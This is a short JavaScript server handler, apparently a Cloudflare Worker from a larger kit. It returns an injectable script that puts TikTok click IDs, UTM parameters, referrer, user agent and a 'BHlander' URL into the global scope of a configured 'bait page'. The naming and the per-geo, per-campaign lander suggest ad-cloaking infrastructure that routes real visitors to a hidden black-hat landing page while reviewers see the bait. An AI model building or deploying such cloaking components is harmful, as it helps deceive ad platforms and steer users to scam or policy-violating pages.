// §4 — smallest lane. Server-side: no branching, just returns a JS blob
// (optionally templated per-request if you want BHlander to vary by geo/campaign).
// Client-side (the returned text): declares ttclid/utm_*/referrer/userAgent/BHlander
// as bare top-level `const`s — these become part of the shared global lexical
// scope every later injected <script> can read (see docs/build-spec.md §0).

import { corsHeaders, handleOptions } from '../../shared/cors.mjs';

function buildDeliveredScript(env, request) {
  // TODO: vary per campaign/geo if you want — request.cf.country is free here.
  const landerUrl = env.LANDER_URL || 'https://REPLACE-lander.pages.dev/';

  return `
const params = new URLSearchParams(window.location.search);
const ttclid = params.get('ttclid');
const utm_source = params.get('utm_source');
const utm_id = params.get('utm_id');
const utm_campaign = params.get('utm_campaign');
const utm_medium = params.get('utm_medium');
const referrer = document.referrer || '';
const userAgent = navigator.userAgent || '';
const BHlander = ${JSON.stringify(landerUrl)};
`.trim();
}

export default {
  async fetch(request, env) {
    const allowedOrigin = env.ALLOWED_ORIGIN || 'https://REPLACE-bait-page.pages.dev';

    if (request.method === 'OPTIONS') return handleOptions(request, allowedOrigin);
    if (request.method !== 'POST') return new Response('Method not allowed', { status: 405 });

    const code = buildDeliveredScript(env, request);
    return new Response(code, {
      status: 200,
      headers: { ...corsHeaders(request, allowedOrigin), 'Content-Type': 'application/javascript' },
    });
  },
};
